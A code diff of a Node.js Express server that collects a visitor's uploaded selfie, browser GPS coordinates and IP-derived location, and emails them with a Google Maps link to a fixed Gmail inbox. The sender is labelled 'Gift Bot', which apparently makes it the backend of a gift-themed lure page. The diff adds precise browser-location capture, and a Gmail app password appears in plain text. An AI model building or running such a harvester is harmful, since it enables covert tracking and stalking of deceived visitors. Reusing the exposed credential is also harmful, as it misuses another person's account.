@@ -8,57 +8,65 @@ const fetch = require("node-fetch"); // ✅ for IP-based location
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Setup multer for image upload
 const upload = multer({ dest: "uploads/" });
+
+// ✅ Allow parsing form fields
+app.use(express.urlencoded({ extended: true }));
 
 app.get("/", (req, res) => {
   res.send("✅ Email server is up and running.");
 });
 
-// 📸 POST: Handle selfie + location + IP
 app.post("/send-email", upload.single("image"), async (req, res) => {
   try {
     const imagePath = req.file.path;
-
-    // 1️⃣ Get IP
     const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
 
-    // 2️⃣ Fetch location using IP (via ipapi.co)
+    // ✅ Get location from IP
     let locationData = {};
     try {
-       const locationRes = await fetch(`https://ipwho.is/${ip}`);
-       const locationData = await locationRes.json();
-
+      const response = await fetch(`https://ipapi.co/${ip}/json/`);
+      locationData = await response.json();
     } catch (err) {
-      console.error("❌ Location fetch failed:", err);
+      console.error("❌ Location fetch from IP failed:", err);
     }
 
-    // 3️⃣ Build mail content
-    const locationInfo = `
+    // ✅ Get lat/lon from form (browser location)
+    const browserLat = req.body.latitude || "N/A";
+    const browserLon = req.body.longitude || "N/A";
+
+    // ✅ Final email content
+    const emailBody = `
+🧍 User Selfie Submission
+
+🌐 IP-Based Location:
 IP Address: ${ip}
 City: ${locationData.city || "N/A"}
 Region: ${locationData.region || "N/A"}
 Country: ${locationData.country_name || "N/A"}
 Postal: ${locationData.postal || "N/A"}
-Latitude: ${locationData.latitude || "N/A"}
-Longitude: ${locationData.longitude || "N/A"}
 ISP: ${locationData.org || "N/A"}
+
+📍 Browser-Based Location:
+Latitude: ${browserLat}
+Longitude: ${browserLon}
+Google Maps: https://www.google.com/maps?q=${browserLat},${browserLon}
 `;
 
-    // 4️⃣ Send mail with selfie + location
+    // ✅ Mail config
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
         user: "adityadrools@gmail.com",
-        pass: "jxqvmogganjsycpm", // App password
+        pass: "jxqvmogganjsycpm",
       },
     });
 
     const mailOptions = {
       from: '"Gift Bot" <adityadrools@gmail.com>',
       to: "adityadrools@gmail.com",
-      subject: "🎁 New Visitor - Selfie, IP & Location",
-      text: `A new visitor has submitted a selfie.\n\n${locationInfo}`,
+      subject: "🎁 New Visitor - Selfie, Location, IP",
+      text: emailBody,
       attachments: [
         {
           filename: "selfie.jpg",
@@ -68,10 +76,11 @@ ISP: ${locationData.org || "N/A"}
     };
 
     await transporter.sendMail(mailOptions);
-    console.log("✅ Email sent with selfie + IP + location.");
+    console.log("✅ Email sent with selfie + full location");
 
-    fs.unlinkSync(imagePath); // clean up
-    res.status(200).send("Email sent with location & image");
+    fs.unlinkSync(imagePath);
+    res.status(200).send("✅ Sent email with selfie + location");
+
   } catch (error) {
     console.error("❌ Failed to send email:", error);
     res.status(500).send("Failed to send email");
